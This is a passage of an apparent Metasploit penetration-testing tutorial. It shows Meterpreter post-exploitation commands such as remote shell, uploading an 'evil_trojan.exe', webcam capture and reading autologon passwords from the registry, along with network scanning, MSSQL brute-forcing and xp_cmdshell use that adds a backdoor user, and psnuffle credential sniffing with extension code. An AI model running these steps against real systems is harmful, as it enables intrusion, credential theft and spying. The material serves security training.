    132   VMwareUser.exe        C:\Program Files\VMware\VMware Tools\VMwareUser.exe
    152   VMwareTray.exe        C:\Program Files\VMware\VMware Tools\VMwareTray.exe
    288   snmp.exe              C:\WINDOWS\System32\snmp.exe
 ...snip...


resource
"""""""""

The ‘resource‘ command will execute Meterpreter instructions located inside a text file. Containing one entry per line, “resource” will execute each line in sequence. This can help automate repetitive actions performed by a user.

By default, the commands will run in the current working directory (on target machine) and resource file in the local working directory (the attacking machine).

::

  meterpreter > resource
 Usage: resource path1 path2Run the commands stored in the supplied files.
 meterpreter >


::

  root@kali:~# cat resource.txt
 ls
 background
 root@kali:~#


Running resource command:

::

  meterpreter> > resource resource.txt
 [*] Reading /root/resource.txt
 [*] Running ls

 Listing: C:\Documents and Settings\Administrator\Desktop
 ========================================================

 Mode              Size    Type  Last modified              Name
 ----              ----    ----  -------------              ----
 40777/rwxrwxrwx   0       dir   2012-02-29 16:41:29 -0500  .
 40777/rwxrwxrwx   0       dir   2012-02-02 12:24:40 -0500  ..
 100666/rw-rw-rw-  606     fil   2012-02-15 17:37:48 -0500  IDA Pro Free.lnk
 100777/rwxrwxrwx  681984  fil   2012-02-02 15:09:18 -0500  Sc303.exe
 100666/rw-rw-rw-  608     fil   2012-02-28 19:18:34 -0500  Shortcut to Ability Server.lnk
 100666/rw-rw-rw-  522     fil   2012-02-02 12:33:38 -0500  XAMPP Control Panel.lnk

 [*] Running background

 [*] Backgrounding session 1...
 msf  exploit(handler) >


search
"""""""

The ‘search‘ commands provides a way of locating specific files on the target host. The command is capable of searching through the whole system or specific folders.

 Wildcards can also be used when creating the file pattern to search for.

 ::

   meterpreter > search
 [-] You must specify a valid file glob to search for, e.g. >search -f *.doc


::

  meterpreter > search -f autoexec.bat
 Found 1 result...
    c:\AUTOEXEC.BAT
 meterpreter > search -f sea*.bat c:\\xamp\\
 Found 1 result...
    c:\\xampp\perl\bin\search.bat (57035 bytes)
 meterpreter >


shell
"""""""

The ‘shell‘ command will present you with a standard shell on the target system.

::

  meterpreter > shell
 Process 39640 created.
 Channel 2 created.
 Microsoft Windows XP [Version 5.1.2600]
 (C) Copyright 1985-2001 Microsoft Corp.

 C:\WINDOWS\system32>


upload
"""""""

As with the ‘download‘ command, you need to use double-slashes with the upload command.

::

  meterpreter > upload evil_trojan.exe c:\\windows\\system32
 [*] uploading  : evil_trojan.exe -> c:\windows\system32
 [*] uploaded   : evil_trojan.exe -> c:\windows\system32\evil_trojan.exe
 meterpreter >


webcam_list
"""""""""""

The ‘webcam_list‘ command when run from the Meterpreter shell, will display currently available web cams on the target host.

::

  meterpreter > webcam_list
 1: Creative WebCam NX Pro
 2: Creative WebCam NX Pro (VFW)
 meterpreter >


webcam_snap
"""""""""""

The ‘webcam_snap’ command grabs a picture from a connected web cam on the target system, and saves it to disc as a JPEG image. By default, the save location is the local current working directory with a randomized filename.

::

  meterpreter > webcam_snap -h
 Usage: webcam_snap [options]
 Grab a frame from the specified webcam.

 OPTIONS:

    -h      Help Banner
    -i >opt>  The index of the webcam to use (Default: 1)
    -p >opt>  The JPEG image path (Default: 'gnFjTnzi.jpeg')
    -q >opt>  The JPEG image quality (Default: '50')
    -v >opt>  Automatically view the JPEG image (Default: 'true')

 meterpreter >


Meterpreter extended by python
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Here are some examples of the Python Extension in action. With time more functionality will be added, making the extension an even more powerful tool.

With the extension loaded, we can use basic Python function such as print. This can be achieved by using the “python_execute” command, and standard Python syntax.

::

  meterpreter > python_execute "print 'Good morning! It\\'s 5am'"
 [+] Content written to stdout:
 Good morning! It's 5am

You can also save to a variable, and print its content using the “-r” switch.

::

  meterpreter > python_execute "import os; cd = os.getcwd()" -r cd
 [+] cd = C:\Users\loneferret\Downloads
 meterpreter >


The following file is located in the “root” folder of our machine. What it does essentially, search the C:\ drive for any file called “readme.txt”. Although this can be done with meterpreter’s native “search” command. One observation, running through the filesystem, has crashed our meterpreter session more than once.

::

  root@kali:~# cat findfiles.py
 import os
 for root, dirs, files in os.walk("c://"):
     for file in files:
         if file.endswith(".txt") and file.startswith("readme"):
              print(os.path.join(root, file))


In order to have this file run on our target machine, we need to invoke the “python_import” command. Using the “-f” switch to specify our script.

::

  meterpreter > python_import -f /root/findfiles.py
 [*] Importing /root/findfiles.py ...
 [+] Content written to stdout:
 c://Program Files\Ext2Fsd\Documents\readme.txt
 c://qemu-0.13.0-windows\patch\readme.txt
 c://Users\loneferret\Desktop\IM-v1.9.16.0\readme.txt


Another example, this time printing some memory information, and calling a Windows message box using the “ctypes” Python module.

::

  meterpreter > python_import -f /root/ctypes_ex.py
 [*] Importing /root/ctypes_ex.py ...
 [+] Content written to stdout:
 >WinDLL 'kernel32', handle 76e30000 at 4085e50>

 metrepreter > python_import -f /root/msgbox.py
 [*] Importing /root/msgbox.py ...
 [+] Command executed without returning a result


Of course, this all depends on the level of access your current meterpreter has. Another simple Python script example, reads the Window’s registry for the “AutoAdminLogon” key.

::

  meterpreter > python_import -f /root/readAutoLogonREG.py
 [*] Importing /root/readAutoLogonREG.py ...
 [+] Content written to stdout:


 [+] Reading from AutoLogon Registry Location
 [-] DefaultUserName loneferret
 [-] DefaultPassword NoNotReally
 [-] AutoAdminLogon Enabled



**************************
Information Gathering
**************************

Port Scanning
==========

Scanners and most other auxiliary modules use the RHOSTS option instead of RHOST. RHOSTS can take IP ranges (192.168.1.20-192.168.1.30), CIDR ranges (192.168.1.0/24), multiple ranges separated by commas (192.168.1.0/24, 192.168.3.0/24), and line-separated host list files (file:/tmp/hostlist.txt). This is another use for a grepable Nmap output file.

By default, all of the scanner modules will have the THREADS value set to ‘1’. The THREADS value sets the number of concurrent threads to use while scanning. Set this value to a higher number in order to speed up your scans or keep it lower in order to reduce network traffic but be sure to adhere to the following guidelines:

*  Keep the THREADS value under 16 on native Win32 systems
*  Keep THREADS under 200 when running MSF under Cygwin
*  On Unix-like operating systems, THREADS can be set as high as 256.


Nmap & db_nmap
^^^^^^^^^^^^^^

We can use the db_nmap command to run Nmap against our targets and our scan results would than be stored automatically in our database. However, if you also wish to import the scan results into another application or framework later on, you will likely want to export the scan results in XML format. It is always nice to have all three Nmap outputs (xml, grepable, and normal). So we can run the Nmap scan using the ‘-oA‘ flag followed by the desired filename to generate the three output files, then issue the db_import command to populate the Metasploit database.

Run Nmap with the options you would normally use from the command line. If we wished for our scan to be saved to our database, we would omit the output flag and use db_nmap. The example below would then be “db_nmap -v -sV 192.168.1.0/24”.

::

  msf > nmap -v -sV 192.168.1.0/24 -oA subnet_1
 [*] exec: nmap -v -sV 192.168.1.0/24 -oA subnet_1

 Starting Nmap 5.00 ( http://nmap.org ) at 2009-08-13 19:29 MDT
 NSE: Loaded 3 scripts for scanning.
 Initiating ARP Ping Scan at 19:29
 Scanning 101 hosts [1 port/host]
 ...
 Nmap done: 256 IP addresses (16 hosts up) scanned in 499.41 seconds
 Raw packets sent: 19973 (877.822KB) | Rcvd: 15125 (609.512KB)

Port Scanning
^^^^^^^^^^^^

In addition to running Nmap, there are a variety of other port scanners that are available to us within the framework.

::

  msf > search portscan

 Matching Modules
 ================

   Name                                      Disclosure Date  Rank    Description
   ----                                      ---------------  ----    -----------
   auxiliary/scanner/natpmp/natpmp_portscan                   normal  NAT-PMP External Port Scanner
   auxiliary/scanner/portscan/ack                             normal  TCP ACK Firewall Scanner
   auxiliary/scanner/portscan/ftpbounce                       normal  FTP Bounce Port Scanner
   auxiliary/scanner/portscan/syn                             normal  TCP SYN Port Scanner
   auxiliary/scanner/portscan/tcp                             normal  TCP Port Scanner
   auxiliary/scanner/portscan/xmas                            normal  TCP "XMas" Port Scanner



For the sake of comparison, we’ll compare our Nmap scan results for port 80 with a Metasploit scanning module. First, let’s determine what hosts had port 80 open according to Nmap.

::

  msf > cat subnet_1.gnmap | grep 80/open | awk '{print $2}'
 [*] exec: cat subnet_1.gnmap | grep 80/open | awk '{print $2}'

 192.168.1.1
 192.168.1.2
 192.168.1.10
 192.168.1.109
 192.168.1.116
 192.168.1.150


The Nmap scan we ran earlier was a SYN scan so we’ll run the same scan across the subnet looking for port 80 through our eth0 interface, using Metasploit.

::

  msf > use auxiliary/scanner/portscan/syn
 msf auxiliary(syn) > show options

 Module options (auxiliary/scanner/portscan/syn):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   BATCHSIZE  256              yes       The number of hosts to scan per set
   DELAY      0                yes       The delay between connections, per thread, in milliseconds
   INTERFACE                   no        The name of the interface
   JITTER     0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS      1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                      yes       The target address range or CIDR identifier
   SNAPLEN    65535            yes       The number of bytes to capture
   THREADS    1                yes       The number of concurrent threads
   TIMEOUT    500              yes       The reply read timeout in milliseconds

 msf auxiliary(syn) > set INTERFACE eth0
 INTERFACE => eth0
 msf auxiliary(syn) > set PORTS 80
 PORTS => 80
 msf auxiliary(syn) > set RHOSTS 192.168.1.0/24
 RHOSTS => 192.168.1.0/24
 msf auxiliary(syn) > set THREADS 50
 THREADS => 50
 msf auxiliary(syn) > run

 [*] TCP OPEN 192.168.1.1:80
 [*] TCP OPEN 192.168.1.2:80
 [*] TCP OPEN 192.168.1.10:80
 [*] TCP OPEN 192.168.1.109:80
 [*] TCP OPEN 192.168.1.116:80
 [*] TCP OPEN 192.168.1.150:80
 [*] Scanned 256 of 256 hosts (100% complete)
 [*] Auxiliary module execution completed


Here we’ll load up the ‘tcp’ scanner and we’ll use it against another target. As with all the previously mentioned plugins, this uses the RHOSTS option. Remember we can issue the ‘hosts -R‘ command to automatically set this option with the hosts found in our database.

::

  msf > use auxiliary/scanner/portscan/tcp
 msf  auxiliary(tcp) > show options

 Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target address range or CIDR identifier
   THREADS      1                yes       The number of concurrent threads
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

 msf  auxiliary(tcp) > hosts -R

 Hosts
 =====

 address         mac                name  os_name  os_flavor  os_sp  purpose  info  comments
 -------         ---                ----  -------  ---------  -----  -------  ----  --------
 172.16.194.172  00:0C:29:D1:62:80        Linux    Ubuntu            server

 RHOSTS => 172.16.194.172

 msf  auxiliary(tcp) > show options

 Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   FILTER                        no        The filter string for capturing traffic
   INTERFACE                     no        The name of the interface
   PCAPFILE                      no        The name of the PCAP capture file to process
   PORTS        1-1024           yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS       172.16.194.172   yes       The target address range or CIDR identifier
   SNAPLEN      65535            yes       The number of bytes to capture
   THREADS      10                yes       The number of concurrent threads
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

 msf  auxiliary(tcp) > run

 [*] 172.16.194.172:25 - TCP OPEN
 [*] 172.16.194.172:23 - TCP OPEN
 [*] 172.16.194.172:22 - TCP OPEN
 [*] 172.16.194.172:21 - TCP OPEN
 [*] 172.16.194.172:53 - TCP OPEN
 [*] 172.16.194.172:80 - TCP OPEN
 [*] 172.16.194.172:111 - TCP OPEN
 [*] 172.16.194.172:139 - TCP OPEN
 [*] 172.16.194.172:445 - TCP OPEN
 [*] 172.16.194.172:514 - TCP OPEN
 [*] 172.16.194.172:513 - TCP OPEN
 [*] 172.16.194.172:512 - TCP OPEN
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 msf  auxiliary(tcp) >


We can see that Metasploit’s built-in scanner modules are more than capable of finding systems and open ports for us. It’s just another excellent tool to have in your arsenal if you happen to be running Metasploit on a system without Nmap installed.

SMB Version Scanning
^^^^^^^^^^^^^^^^^^

Now that we have determined which hosts are available on the network, we can attempt to determine the operating systems they are running. This will help us narrow down our attacks to target a specific system and will stop us from wasting time on those that aren’t vulnerable to a particular exploit.

Since there are many systems in our scan that have port 445 open, we will use the scanner/smb/version module to determine which version of Windows is running on a target and which Samba version is on a Linux host.

::

  msf > use auxiliary/scanner/smb/smb_version
 msf auxiliary(smb_version) > set RHOSTS 192.168.1.200-210
 RHOSTS => 192.168.1.200-210
 msf auxiliary(smb_version) > set THREADS 11
 THREADS => 11
 msf auxiliary(smb_version) > run

 [*] 192.168.1.209:445 is running Windows 2003 R2 Service Pack 2 (language: Unknown) (name:XEN-2K3-FUZZ) (domain:WORKGROUP)
 [*] 192.168.1.201:445 is running Windows XP Service Pack 3 (language: English) (name:V-XP-EXPLOIT) (domain:WORKGROUP)
 [*] 192.168.1.202:445 is running Windows XP Service Pack 3 (language: English) (name:V-XP-DEBUG) (domain:WORKGROUP)
 [*] Scanned 04 of 11 hosts (036% complete)
 [*] Scanned 09 of 11 hosts (081% complete)
 [*] Scanned 11 of 11 hosts (100% complete)
 [*] Auxiliary module execution completed


Also notice that if we issue the hosts command now, the newly-acquired information is stored in Metasploit’s database.

::

  msf auxiliary(smb_version) > hosts

 Hosts
 =====

 address        mac  name  os_name            os_flavor  os_sp  purpose  info  comments
 -------        ---  ----  -------            ---------  -----  -------  ----  --------
 192.168.1.201             Microsoft Windows  XP         SP3    client
 192.168.1.202             Microsoft Windows  XP         SP3    client
 192.168.1.209             Microsoft Windows  2003 R2    SP2    server


Idle Scanning
^^^^^^^^^^^^

Nmap’s IPID Idle scanning allows us to be a little stealthy scanning a target while spoofing the IP address of another host on the network. In order for this type of scan to work, we will need to locate a host that is idle on the network and uses IPID sequences of either Incremental or Broken Little-Endian Incremental. Metasploit contains the module scanner/ip/ipidseq to scan and look for a host that fits the requirements.

In the free online Nmap book, you can find out more information on Nmap Idle Scanning. https://nmap.org/book/idlescan.html


::

  msf > use auxiliary/scanner/ip/ipidseq
 msf auxiliary(ipidseq) > show options

 Module options (auxiliary/scanner/ip/ipidseq):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   INTERFACE                   no        The name of the interface
   RHOSTS                      yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port
   SNAPLEN    65535            yes       The number of bytes to capture
   THREADS    1                yes       The number of concurrent threads
   TIMEOUT    500              yes       The reply read timeout in milliseconds

 msf auxiliary(ipidseq) > set RHOSTS 192.168.1.0/24
 RHOSTS => 192.168.1.0/24
 msf auxiliary(ipidseq) > set THREADS 50
 THREADS => 50
 msf auxiliary(ipidseq) > run

 [*] 192.168.1.1's IPID sequence class: All zeros
 [*] 192.168.1.2's IPID sequence class: Incremental!
 [*] 192.168.1.10's IPID sequence class: Incremental!
 [*] 192.168.1.104's IPID sequence class: Randomized
 [*] 192.168.1.109's IPID sequence class: Incremental!
 [*] 192.168.1.111's IPID sequence class: Incremental!
 [*] 192.168.1.114's IPID sequence class: Incremental!
 [*] 192.168.1.116's IPID sequence class: All zeros
 [*] 192.168.1.124's IPID sequence class: Incremental!
 [*] 192.168.1.123's IPID sequence class: Incremental!
 [*] 192.168.1.137's IPID sequence class: All zeros
 [*] 192.168.1.150's IPID sequence class: All zeros
 [*] 192.168.1.151's IPID sequence class: Incremental!
 [*] Auxiliary module execution completed


Judging by the results of our scan, we have a number of potential zombies we can use to perform idle scanning. We’ll try scanning a host using the zombie at 192.168.1.109 and see if we get the same results we had earlier.

::

  msf auxiliary(ipidseq) > nmap -Pn -sI 192.168.1.109 192.168.1.114
 [*] exec: nmap -Pn -sI 192.168.1.109 192.168.1.114

 Starting Nmap 5.00 ( http://nmap.org ) at 2009-08-14 05:51 MDT
 Idle scan using zombie 192.168.1.109 (192.168.1.109:80); Class: Incremental
 Interesting ports on 192.168.1.114:
 Not shown: 996 closed|filtered ports
 PORT STATE SERVICE
 135/tcp open msrpc
 139/tcp open netbios-ssn
 445/tcp open microsoft-ds
 3389/tcp open ms-term-serv
 MAC Address: 00:0C:29:41:F2:E8 (VMware)

 Nmap done: 1 IP address (1 host up) scanned in 5.56 seconds



Hunting for MSSQL
==================

Searching for and locating MSSQL installations inside the internal network can be achieved using UDP foot-printing. When MSSQL installs, it installs either on TCP port 1433 or a randomized dynamic TCP port. If the port is dynamically attributed, querying UDP port 1434 will provide us with information on the server including the TCP port on which the service is listening.

Let us search for and load the MSSQL ping module inside the msfconsole.

::

  msf > search mssql

 Matching Modules
 ================

   Name                                                      Disclosure Date  Rank       Description
   ----                                                      ---------------  ----       -----------
   auxiliary/admin/mssql/mssql_enum                                           normal     Microsoft SQL Server Configuration Enumerator
   auxiliary/admin/mssql/mssql_enum_domain_accounts                           normal     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                      normal     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
   auxiliary/admin/mssql/mssql_enum_sql_logins                                normal     Microsoft SQL Server SUSER_SNAME SQL Logins Enumeration
   auxiliary/admin/mssql/mssql_escalate_dbowner                               normal     Microsoft SQL Server Escalate Db_Owner
   auxiliary/admin/mssql/mssql_escalate_dbowner_sqli                          normal     Microsoft SQL Server SQLi Escalate Db_Owner
   auxiliary/admin/mssql/mssql_escalate_execute_as                            normal     Microsoft SQL Server Escalate EXECUTE AS
   auxiliary/admin/mssql/mssql_escalate_execute_as_sqli                       normal     Microsoft SQL Server SQLi Escalate Execute AS
   auxiliary/admin/mssql/mssql_exec                                           normal     Microsoft SQL Server xp_cmdshell Command Execution
   auxiliary/admin/mssql/mssql_findandsampledata                              normal     Microsoft SQL Server Find and Sample Data
   auxiliary/admin/mssql/mssql_idf                                            normal     Microsoft SQL Server Interesting Data Finder
   auxiliary/admin/mssql/mssql_ntlm_stealer                                   normal     Microsoft SQL Server NTLM Stealer
   auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                              normal     Microsoft SQL Server SQLi NTLM Stealer
   auxiliary/admin/mssql/mssql_sql                                            normal     Microsoft SQL Server Generic Query
   auxiliary/admin/mssql/mssql_sql_file                                       normal     Microsoft SQL Server Generic Query from File
   auxiliary/analyze/jtr_mssql_fast                                           normal     John the Ripper MS SQL Password Cracker (Fast Mode)
   auxiliary/gather/lansweeper_collector                                      normal     Lansweeper Credential Collector
   auxiliary/scanner/mssql/mssql_hashdump                                     normal     MSSQL Password Hashdump
   auxiliary/scanner/mssql/mssql_login                                        normal     MSSQL Login Utility
   auxiliary/scanner/mssql/mssql_ping                                         normal     MSSQL Ping Utility
   auxiliary/scanner/mssql/mssql_schemadump                                   normal     MSSQL Schema Dump
   auxiliary/server/capture/mssql                                             normal     Authentication Capture: MSSQL
   exploit/windows/iis/msadc                                 1998-07-17       excellent  MS99-025 Microsoft IIS MDAC msadcs.dll RDS Arbitrary Remote Command Execution
   exploit/windows/mssql/lyris_listmanager_weak_pass         2005-12-08       excellent  Lyris ListManager MSDE Weak sa Password
   exploit/windows/mssql/ms02_039_slammer                    2002-07-24       good       MS02-039 Microsoft SQL Server Resolution Overflow
   exploit/windows/mssql/ms02_056_hello                      2002-08-05       good       MS02-056 Microsoft SQL Server Hello Overflow
   exploit/windows/mssql/ms09_004_sp_replwritetovarbin       2008-12-09       good       MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption
   exploit/windows/mssql/ms09_004_sp_replwritetovarbin_sqli  2008-12-09       excellent  MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption via SQL Injection
   exploit/windows/mssql/mssql_clr_payload                   1999-01-01       excellent  Microsoft SQL Server Clr Stored Procedure Payload Execution
   exploit/windows/mssql/mssql_linkcrawler                   2000-01-01       great      Microsoft SQL Server Database Link Crawling Command Execution
   exploit/windows/mssql/mssql_payload                       2000-05-30       excellent  Microsoft SQL Server Payload Execution
   exploit/windows/mssql/mssql_payload_sqli                  2000-05-30       excellent  Microsoft SQL Server Payload Execution via SQL Injection
   post/windows/gather/credentials/mssql_local_hashdump                       normal     Windows Gather Local SQL Server Hash Dump
   post/windows/manage/mssql_local_auth_bypass                                normal     Windows Manage Local Microsoft SQL Server Authorization Bypass

 msf > use auxiliary/scanner/mssql/mssql_ping
 msf auxiliary(mssql_ping) > show options

 Module options (auxiliary/scanner/mssql/mssql_ping):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   PASSWORD                              no        The password for the specified username
   RHOSTS                                yes       The target address range or CIDR identifier
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   THREADS              1                yes       The number of concurrent threads
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)

 msf auxiliary(mssql_ping) > set RHOSTS 10.211.55.1/24
 RHOSTS => 10.211.55.1/24
 msf auxiliary(mssql_ping) > exploit

 [*] SQL Server information for 10.211.55.128:
 [*] tcp = 1433
 [*] np = SSHACKTHISBOX-0pipesqlquery
 [*] Version = 8.00.194
 [*] InstanceName = MSSQLSERVER
 [*] IsClustered = No
 [*] ServerName = SSHACKTHISBOX-0
 [*] Auxiliary module execution completed


The first command we issued was to search for any ‘mssql‘ plugins. The second set of instructions was the ‘use scanner/mssql/mssql_ping‘, this will load the scanner module for us.

Next, ‘show options‘ allows us to see what we need to specify. The ‘set RHOSTS 10.211.55.1/24‘ sets the subnet range we want to start looking for SQL servers on. You could specify a /16 or whatever you want to go after. We would recommend increasing the number of threads as this could take a long time with a single threaded scanner.

After the run command is issued, a scan is going to be performed and pull back specific information about the MSSQL server. As we can see, the name of the machine is “SSHACKTHISBOX-0” and the TCP port is running on 1433.

At this point you could use the scanner/mssql/mssql_login module to brute-force the password by passing the module a dictionary file. Alternatively, you could also use medusa, or THC-Hydra to do this. Once you successfully guess the password, there’s a neat little module for executing the xp_cmdshell stored procedure.

::

  msf auxiliary(mssql_login) > use auxiliary/admin/mssql/mssql_exec
 msf auxiliary(mssql_exec) > show options

 Module options (auxiliary/admin/mssql/mssql_exec):

   Name                 Current Setting                       Required  Description
   ----                 ---------------                       --------  -----------
   CMD                  cmd.exe /c echo OWNED > C:\owned.exe  no        Command to execute
   PASSWORD                                                   no        The password for the specified username
   RHOST                                                      yes       The target address
   RPORT                1433                                  yes       The target port (TCP)
   TDSENCRYPTION        false                                 yes       Use TLS/SSL for TDS data "Force Encryption"
   USERNAME             sa                                    no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false                                 yes       Use windows authentification (requires DOMAIN option set)


 msf auxiliary(mssql_exec) > set RHOST 10.211.55.128
 RHOST => 10.211.55.128
 msf auxiliary(mssql_exec) > set MSSQL_PASS password
 MSSQL_PASS => password
 msf auxiliary(mssql_exec) > set CMD net user bacon ihazpassword /ADD
 cmd => net user rel1k ihazpassword /ADD
 msf auxiliary(mssql_exec) > exploit

 The command completed successfully.

 [*] Auxiliary module execution completed


Looking at the output of the ‘net user bacon ihazpassword /ADD’, we have successfully added a user account named “bacon”, from there we could issue ‘net localgroup administrators bacon /ADD‘ to get a local administrator on the system itself. We have full control over the system at this point.

Service Identification
========================

SSH Service
^^^^^^^^^^^^

A previous scan shows us we have TCP port 22 open on two machines. SSH is very secure but vulnerabilities are not unheard of and it always pays to gather as much information as possible from your targets.

::

  msf > services -p 22 -c name,port,proto

 Services
 ========

 host            name  port  proto
 ----            ----  ----  -----
 172.16.194.163  ssh   22    tcp
 172.16.194.172  ssh   22    tcp


We’ll load up the ‘ssh_version‘ auxiliary scanner and issue the ‘set‘ command to set the ‘RHOSTS‘ option. From there we can run the module by simple typing ‘run’

::

  msf > use auxiliary/scanner/ssh/ssh_version

 msf  auxiliary(ssh_version) > set RHOSTS 172.16.194.163 172.16.194.172
 RHOSTS => 172.16.194.163 172.16.194.172

 msf  auxiliary(ssh_version) > show options

 Module options (auxiliary/scanner/ssh/ssh_version):

   Name     Current Setting                Required  Description
   ----     ---------------                --------  -----------
   RHOSTS   172.16.194.163 172.16.194.172  yes       The target address range or CIDR identifier
   RPORT    22                             yes       The target port
   THREADS  1                              yes       The number of concurrent threads
   TIMEOUT  30                             yes       Timeout for the SSH probe


 msf  auxiliary(ssh_version) > run

 [*] 172.16.194.163:22, SSH server version: SSH-2.0-OpenSSH_5.3p1 Debian-3ubuntu7
 [*] Scanned 1 of 2 hosts (050% complete)
 [*] 172.16.194.172:22, SSH server version: SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1
 [*] Scanned 2 of 2 hosts (100% complete)
 [*] Auxiliary module execution completed


FTP Service
^^^^^^^^^^

Poorly configured FTP servers can frequently be the foothold you need in order to gain access to an entire network so it always pays off to check to see if anonymous access is allowed whenever you encounter an open FTP port which is usually on TCP port 21. We’ll set the THREADS to 1 here as we’re only going to scan 1 host.

::

  msf > services -p 21 -c name,proto

 Services
 ========

 host            name  proto
 ----            ----  -----
 172.16.194.172  ftp   tcp

 msf > use auxiliary/scanner/ftp/ftp_version

 msf  auxiliary(ftp_version) > set RHOSTS 172.16.194.172
 RHOSTS => 172.16.194.172

 msf  auxiliary(anonymous) > show options
 Module options (auxiliary/scanner/ftp/anonymous):

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   FTPPASS  mozilla@example.com  no        The password for the specified username
   FTPUSER  anonymous            no        The username to authenticate as
   RHOSTS   172.16.194.172       yes       The target address range or CIDR identifier
   RPORT    21                   yes       The target port
   THREADS  1                    yes       The number of concurrent threads

 msf  auxiliary(anonymous) > run

 [*] 172.16.194.172:21 Anonymous READ (220 (vsFTPd 2.3.4))
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed

In a short amount of time and with very little work, we are able to acquire a great deal of information about the hosts residing on our network thus providing us with a much better picture of what we are facing when conducting our penetration test.

There are obviously too many scanners for us to show case. It is clear however the Metasploit Framework is well suited for all your scanning and identification needs.

::

  msf > use auxiliary/scanner/
 Display all 485 possibilities? (y or n)

 ...snip...


Password Sniffing
================

Max Moser released a Metasploit password sniffing module named psnuffle that will sniff passwords off the wire similar to the tool dsniff. It currently supports POP3, IMAP, FTP, and HTTP GET. More information is available on his blog.

Using the psnuffle module is extremely simple. There are some options available but the module works great “out of the box”.

::

  msf > use auxiliary/sniffer/psnuffle
 msf auxiliary(psnuffle) > show options

 Module options:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   FILTER                      no        The filter string for capturing traffic
   INTERFACE                   no        The name of the interface
   PCAPFILE                    no        The name of the PCAP capture file to process
   PROTOCOLS  all              yes       A comma-delimited list of protocols to sniff or "all".
   SNAPLEN    65535            yes       The number of bytes to capture
   TIMEOUT    1                yes       The number of seconds to wait for new data

There are some options available, including the ability to import a PCAP capture file. We will run the psnuffle scanner in its default mode.

::

  msf auxiliary(psnuffle) > run
 [*] Auxiliary module execution completed
 [*] Loaded protocol FTP from /usr/share/metasploit-framework/data/exploits/psnuffle/ftp.rb...
 [*] Loaded protocol IMAP from /usr/share/metasploit-framework/data/exploits/psnuffle/imap.rb...
 [*] Loaded protocol POP3 from /usr/share/metasploit-framework/data/exploits/psnuffle/pop3.rb...
 [*] Loaded protocol URL from /usr/share/metasploit-framework/data/exploits/psnuffle/url.rb...
 [*] Sniffing traffic.....
 [*] Successful FTP Login: 192.168.1.100:21-192.168.1.5:48614 >> victim / pass (220 3Com 3CDaemon FTP Server Version 2.0)

There! We’ve captured a successful FTP login. This is an excellent tool for passive information gathering.


Extending Psnuffle
^^^^^^^^^^^^^^^^

Psnuffle is easy to extend due to its modular design. This section will guide through the process of developing an IRC (Internet Relay Chat) protocol sniffer (Notify and Nick messages).

Module location
""""""""""""""""

All the different modules are located in data/exploits/psnuffle. The names are corresponding to the protocol names used inside psnuffle. To develop our own module, we take a look at the important parts of the existing pop3 sniffer module as a template.

::

  self.sigs = {
 :ok => /^(+OK[^n]*)n/si,
 :err => /^(-ERR[^n]*)n/si,
 :user => /^USERs+([^n]+)n/si,
 :pass => /^PASSs+([^n]+)n/si,
 :quit => /^(QUITs*[^n]*)n/si }

This section defines the expression patterns which will be used during sniffing to identify interesting data. Regular expressions look very strange at the beginning but are very powerful. In short everything within () will be available within a variable later on in the script.

Defining our own psnuffle module
""""""""""""""""""""""""""""""""""

::

  self.sigs = {
 :user => /^(NICKs+[^n]+)/si,
 :pass => /b(IDENTIFYs+[^n]+)/si,}

For IRC this section would look like the ones above. Not all nickservers are using IDENTIFY to send the password, but the one on Freenode does.

Session Definition
""""""""""""""""""

For every module we first have to define what ports it should handle and how the session should be tracked.

::

  return if not pkt[:tcp] # We don't want to handle anything other than tcp
 return if (pkt[:tcp].src_port != 6667 and pkt[:tcp].dst_port != 6667) # Process only packet on port 6667

 #Ensure that the session hash stays the same for both way of communication
 if (pkt[:tcp].dst_port == 6667) # When packet is sent to server
 s = find_session("#{pkt[:ip].dst_ip}:#{pkt[:tcp].dst_port}-#{pkt[:ip].src_ip}:#{pkt[:tcp].src_port}")
 else # When packet is coming from the server
 s = find_session("#{pkt[:ip].src_ip}:#{pkt[:tcp].src_port}-#{pkt[:ip].dst_ip}:#{pkt[:tcp].dst_port}")
 end

Now that we have a session object that uniquely consolidates info, we can go on and process packet content that matched one of the regular expressions we defined earlier.

::

  case matched
 when :user # when the pattern "/^(NICKs+[^n]+)/si" is matching the packet content
 s[:user]=matches #Store the name into the session hash s for later use
 # Do whatever you like here... maybe a puts if you need to
 when :pass # When the pattern "/b(IDENTIFYs+[^n]+)/si" is matching
 s[:pass]=matches # Store the password into the session hash s as well
